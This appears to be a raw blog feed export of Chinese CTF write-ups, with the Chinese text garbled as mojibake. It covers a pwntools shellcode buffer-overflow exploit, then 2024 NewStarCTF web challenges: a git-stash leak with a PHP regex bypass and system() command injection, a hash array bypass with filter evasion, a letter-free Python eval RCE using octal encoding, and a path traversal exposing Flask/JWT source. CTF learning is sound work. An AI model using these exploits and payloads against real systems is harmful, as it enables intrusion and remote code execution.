python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug != <span class="number">0</span> :</span><br><span class="line">    io = remote(<span class="string">&#x27;172.26.208.1&#x27;</span>,<span class="number">6400</span>)</span><br><span class="line"><span class="keyword">else</span>:   </span><br><span class="line">    io = process(file_name)</span><br><span class="line"></span><br><span class="line">elf=ELF(file_name)</span><br><span class="line"></span><br><span class="line">context(arch=elf.arch)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;1000000&#x27;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="built_in">int</span>(io.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x60</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(padding,<span class="string">b&#x27;a&#x27;</span>) + p64(ret_addr) </span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024NewStarCTF-WP-Web</title>
      <link href="/2024/12/28/2024NewStarCTF-WP-Web/"/>
      <url>/2024/12/28/2024NewStarCTF-WP-Web/</url>
      
        <content type="html"><![CDATA[<p>è¥¿ç”µé“¾æ¥ï¼š</p><p><a href="https://ctf.xidian.edu.cn/">è¥¿ç”µ CTF ç»ˆç«¯</a></p><h1 id="Week-2"><a href="#Week-2" class="headerlink" title="Week 2"></a>Week 2</h1><h2 id="pangbaiè¿‡å®¶å®¶-2"><a href="#pangbaiè¿‡å®¶å®¶-2" class="headerlink" title="pangbaiè¿‡å®¶å®¶(2)"></a>pangbaiè¿‡å®¶å®¶(2)</h2><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-19-51.png" class=""><p>è¿æ¥è¿›å…¥ï¼Œå«æ¸…ç‚¹æ³„éœ²æ–‡ä»¶</p><p>é¦–å…ˆç”¨dirsearchæ‰«ä¸€ä¸‹ç›®å½•</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-20-18.png" class=""><p>å‘ç°.gitæ–‡ä»¶ï¼Œç¡®å®šä¸ºgitæ³„éœ²ï¼Œç”¨GithackæŠŠæ³„éœ²çš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-23-18.png" class=""><p>logå’Œbranchéƒ½æ²¡æœ‰æ‰¾åˆ°åé—¨ï¼Œè¿˜æœ‰å¯èƒ½çš„å°±æ˜¯stash(ä¸´æ—¶ä¿å­˜åŒº)äº†</p><p><a href="https://geek-docs.com/git/git-cmds/git-stash.html">Git â€“ Stashå‘½ä»¤|æå®¢æ•™ç¨‹</a></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-25-21.png" class=""><p>å‘ç°åé¢ï¼Œç”¨stash applyå°†æš‚å­˜åŒºé‡æ–°åº”ç”¨</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-29-56.png" class=""><p>æ‰¾åˆ°åé—¨æ–‡ä»¶æºä»£ç ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡</p><p><mark>å…³é”®ç‚¹1ï¼š<em>éæ³•å­—ç¬¦è½¬æ¢ä¸‹åˆ’çº¿</em></mark></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-33-33.png" class=""><p>æ•…è¿™é‡Œåœ¨æäº¤payloadæ—¶ï¼ŒNewStar_CTF.2024è¦å†™ä¸ºNewStar[CTF.2024</p><p><mark>å…³é”®ç‚¹2ï¼š<em>æ­£åˆ™è¡¨è¾¾å¼é¦–ä½æ£€æµ‹ç»•è¿‡</em></mark></p><p>preg_matché»˜è®¤ä¸ºå•è¡Œæ¨¡å¼ï¼Œå¦‚æœå­—ç¬¦ä¸²æœ«å°¾æ˜¯æ¢è¡Œç¬¦ï¼Œåˆ™æ¢è¡Œç¬¦ä¼šè¢«å½“åšè¡Œå°¾è€Œä¸æ˜¯å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯åœ¨ä¸¥æ ¼ä¸ç­‰äº!&#x3D;&#x3D;ä¸­ï¼Œâ€Welcomeâ€å’Œâ€Welcome\nâ€æ˜¯ä¸ç­‰çš„ï¼Œ</p><p>æ‰€ä»¥è¿™é‡Œæ„é€ çš„æœ€ç»ˆpayloadæ˜¯ <u>NewStar[CTF.2024&#x3D;Welcome%0a</u>ï¼ˆ%0aæ˜¯æ¢è¡Œç¬¦çš„urlç¼–ç ï¼‰</p><p>func&#x3D;system</p><p>args&#x3D;â€™ls &#x2F;â€˜</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-29_00-05-42.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-29_00-05-35.png" class=""><p>ä¼ å…¥å‘ç°æ²¡æœ‰å›æ˜¾ï¼ŒçŒœæµ‹æ˜¯ls &#x2F;è¢«è¿‡æ»¤äº†æˆ–è€…ç¼ºå°‘æƒé™ï¼ˆï¼Ÿå…¶å®æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼‰ï¼Œå› ä¸ºä¹‹å‰çš„flagå¤§éƒ¨åˆ†éƒ½åœ¨ç¯å¢ƒå˜é‡é‡Œï¼Œæ‰€ä»¥è¿™é‡Œå°è¯•ç”¨envè¯­å¥æ‰“å°ç¯å¢ƒå˜é‡</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-29_00-06-06.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-29_00-06-32.png" class=""><p>å¾—åˆ°flag</p><h2 id="é—å¤±çš„æ‹‰é“¾"><a href="#é—å¤±çš„æ‹‰é“¾" class="headerlink" title="é—å¤±çš„æ‹‰é“¾"></a>é—å¤±çš„æ‹‰é“¾</h2><p>é¢˜ç›®æ˜¯æ‹‰é“¾ï¼Œæƒ³åˆ°zipï¼Œåº”è¯¥æ˜¯ä¸€ä¸ª.zipæºç æ³„éœ²ï¼Œæ‰€ä»¥å…ˆæ‰«ä¸€ä¸‹ç›®å½•çœ‹çœ‹</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip1.png" class=""><p>æœç„¶æœ‰ï¼Œä¸‹è½½ä¸‹æ¥ï¼Œæ‹¿åˆ°æºä»£ç </p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip2.png" class=""><p>æœ‰ä¸€ä¸ªphpå†…å®¹å¦‚ä¸‹</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip3.png" class=""><p>æ˜¯ä¸€ä¸ªç®€å•çš„æ¯”è¾ƒç»•è¿‡</p><p><em>sha_1å’Œmd5å¼ºç›¸ç­‰ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯å¾ˆéš¾æ‰¾åˆ°ä¸¤ä¸ªå­—ç¬¦ç¬¦åˆè¦æ±‚çš„ï¼Œæ‰€ä»¥æƒ³åˆ°ä¼ å…¥ä¸¤ä¸ªæ•°ç»„ï¼Œè¿™æ ·ä¸¤ä¸ªå‡½æ•°çš„è¿”å›å€¼éƒ½æ˜¯nullï¼Œå°±å¯ä»¥å¼ºç›¸ç­‰äº†ï¼ŒåŒæ—¶ä¹Ÿç»•è¿‡äº†ä¸ç­‰å·</em></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip4.png" class=""><p>ä»£ç é‡ŒæŠŠcatå’Œflagè¿‡æ»¤äº†ï¼Œæˆ‘ä»¬ç”¨å’Œcatæ•ˆæœå·®ä¸å¤šçš„moreæ¥è¯»å–æ–‡ä»¶ï¼Œflagä¹Ÿä¸ç”¨æ‰“å…¨ï¼Œç”¨é€šé…ç¬¦*å³å¯</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip5.png" class=""><h1 id="week-3"><a href="#week-3" class="headerlink" title="week 3"></a>week 3</h1><h2 id="è‡­çš®çš„è®¡ç®—å™¨"><a href="#è‡­çš®çš„è®¡ç®—å™¨" class="headerlink" title="è‡­çš®çš„è®¡ç®—å™¨"></a>è‡­çš®çš„è®¡ç®—å™¨</h2><p>è½½å…¥é¡µé¢ï¼Œå«æˆ‘ä»¬å»&#x2F;calè·¯å¾„ï¼Œæ¥åˆ°è¿™ä¸ªè·¯å¾„åï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°åç«¯flaskæºç ç›´æ¥ç»™äº†</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cal2.png" class=""><p>æºç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    token = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>:</span><br><span class="line">            token = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        num = request.form.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">        script = <span class="string">f&#x27;&#x27;&#x27;import os</span></span><br><span class="line"><span class="string">print(eval(&quot;<span class="subst">&#123;num&#125;</span>&quot;))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(script)</span><br><span class="line">        <span class="keyword">if</span> waf(num):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result_output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">with</span> tempfile.NamedTemporaryFile(mode=<span class="string">&#x27;w+&#x27;</span>, suffix=<span class="string">&#x27;.py&#x27;</span>, delete=<span class="literal">False</span>) <span class="keyword">as</span> temp_script:</span><br><span class="line">                    temp_script.write(script)</span><br><span class="line">                    temp_script_path = temp_script.name</span><br><span class="line"></span><br><span class="line">                result = subprocess.run([<span class="string">&#x27;python3&#x27;</span>, temp_script_path], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">                os.remove(temp_script_path)</span><br><span class="line"></span><br><span class="line">                result_output = result.stdout <span class="keyword">if</span> result.returncode == <span class="number">0</span> <span class="keyword">else</span> result.stderr</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">                result_output = <span class="built_in">str</span>(e)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=result_output)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=<span class="string">&quot;è‡­çš®ï¼ä½ æƒ³å¹²ä»€ä¹ˆï¼ï¼&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=<span class="string">&#x27;è¯•è¯•å‘—&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">30002</span>)</span><br></pre></td></tr></table></figure><p>åˆ†ææºç å¯å¾—ï¼Œæˆ‘ä»¬è¾“å…¥numï¼Œç¨‹åºè‡ªåŠ¨è®¡ç®—numçš„è¡¨è¾¾å¼æ•°å€¼ï¼Œä¸”ç”¨åˆ°äº†evalå‡½æ•°ï¼Œè¿™é‡ŒåŒ…å«ä¸€ä¸ªRCEæ¼æ´ï¼Œä½†å…³é”®åœ¨äºï¼Œè¿˜æœ‰ä¸€ä¸ªé˜²ç«å¢™ï¼Œè¿‡æ»¤äº†æ‰€æœ‰å­—æ¯ï¼Œæ‰€ä»¥æ˜¯ä¸€ä¸ªæ— å­—æ¯çš„RCEã€‚</p><p>pythonçš„æ— å­—æ¯rceï¼Œç”¨çš„æ¯”è¾ƒå¤šçš„æ˜¯å…«è¿›åˆ¶ç»•è¿‡ï¼Œè¿™é‡Œç®€å•å†™ä¸€ä¸ªç¨‹åºæŠŠæˆ‘ä»¬çš„payloadè½¬ä¸ºå…«è¿›åˆ¶ç¼–ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">txt=<span class="built_in">input</span>(<span class="string">&quot;payload:&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> txt:</span><br><span class="line">    <span class="keyword">if</span> i.isalpha() <span class="keyword">or</span> i==<span class="string">&#x27;_&#x27;</span> :</span><br><span class="line">        payload+=<span class="string">&#x27;\\&#x27;</span>+<span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=i</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><img src="/2024/12/28/2024NewStarCTF-WP-Web/cal3.png" class=""><p>ä¼ å…¥å¾—åˆ°flag</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cal4.png" class=""><h2 id="è¿™ç…§ç‰‡æ˜¯ä½ å—"><a href="#è¿™ç…§ç‰‡æ˜¯ä½ å—" class="headerlink" title="è¿™ç…§ç‰‡æ˜¯ä½ å—"></a>è¿™ç…§ç‰‡æ˜¯ä½ å—</h2><p>è¿å…¥ç¯å¢ƒï¼Œæ—¥å¸¸çœ‹æºä»£ç æ‰¾æç¤º</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph1.png" class=""><p>è¿™é‡Œä¸å¤ªçœ‹å¾—æ˜ç™½å…¶ä¸­çš„åŸç†ï¼Œä½†éšçº¦æ„Ÿè§‰åº”è¯¥æœ‰ä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´ï¼Œè¿™é‡Œéšä¾¿è¯•ä¸€ä¸‹è®¿é—®å›¾ç‰‡</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph2.png" class=""><p>çœ‹ä¸Šå»æ˜¯å¯ä»¥ç”¨è·¯å¾„è®¿é—®æ–‡ä»¶çš„ï¼Œé‚£ä¹ˆå°±å¾—å¼„æ˜ç™½æºä»£ç åœ¨å“ªï¼Œç»§ç»­æ”¶é›†ä¿¡æ¯å‘ç°</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph3.png" class=""><p>è¿™é‡Œçš„serveræ˜¯pythonï¼Œåº”è¯¥æ˜¯flaskï¼Œé‚£ä¹ˆæºä»£ç åº”è¯¥æ˜¯åœ¨app.py</p><p>è€Œä¸”ä¸€èˆ¬flaskçš„é™æ€æ–‡ä»¶éƒ½æ”¾åœ¨å’Œapp.pyåŒç›®å½•çš„staticæ–‡ä»¶å¤¹é‡Œï¼ŒçŒœæµ‹å¯èƒ½å½“å‰ç›®å½•å°±æ˜¯staticï¼Œè¯•è¯•è·¯å¾„ç©¿é€</p><p><em>æ³¨æ„è¿™é‡Œä¸è¦ç›´æ¥åœ¨æµè§ˆå™¨ç›®å½•ç«¯å£å†™..&#x2F;ï¼Œä¼šè¢«è¿‡æ»¤æ‰ï¼Œè¦æŠ“åŒ…åä¿®æ”¹</em></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph4.png" class=""><p>æ‹¿åˆ°æºä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, render_template_string, request, redirect, send_file</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> get_random_number_string</span><br><span class="line"></span><br><span class="line">base_key = <span class="built_in">str</span>(uuid.uuid4()).split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">secret_key = get_random_number_string(<span class="number">6</span>)</span><br><span class="line">admin_pass = <span class="string">&quot;&quot;</span>.join([ _ <span class="keyword">for</span> _ <span class="keyword">in</span> base_key])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(admin_pass)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">failure_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: admin_pass,</span><br><span class="line">    <span class="string">&#x27;amiya&#x27;</span>: <span class="string">&quot;114514&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_token</span>(<span class="params">token</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">global</span> failure_count</span><br><span class="line">        <span class="keyword">if</span> failure_count &gt;= <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="number">403</span>)</span><br><span class="line">        data = jwt.decode(token, secret_key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> data.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            failure_count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;You are not admin!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">403</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">401</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/home&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">global</span> failure_count</span><br><span class="line">    <span class="keyword">if</span> failure_count &gt;= <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> users.get(username)==password:</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;user&#x27;</span>: username, <span class="string">&#x27;exp&#x27;</span>: <span class="built_in">int</span>(time.time()) + <span class="number">600</span>&#125;, secret_key)</span><br><span class="line">        response = make_response(<span class="string">&#x27;Login success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;</span>)</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        failure_count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&#x27;Could not verify!&lt;br&gt;&lt;img src=&quot;/3.png&quot;&gt;&#x27;</span>, <span class="number">401</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = make_response(<span class="string">&#x27;Logout success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;</span>)</span><br><span class="line">    response.set_cookie(<span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;&#x27;</span>, expires=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    logged_in = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        data = jwt.decode(token, secret_key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        text = <span class="string">&quot;Hello, %s!&quot;</span> % data.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        logged_in = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        logged_in = <span class="literal">False</span></span><br><span class="line">        text = <span class="string">&quot;You have not logged in!&quot;</span></span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Home Page&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span 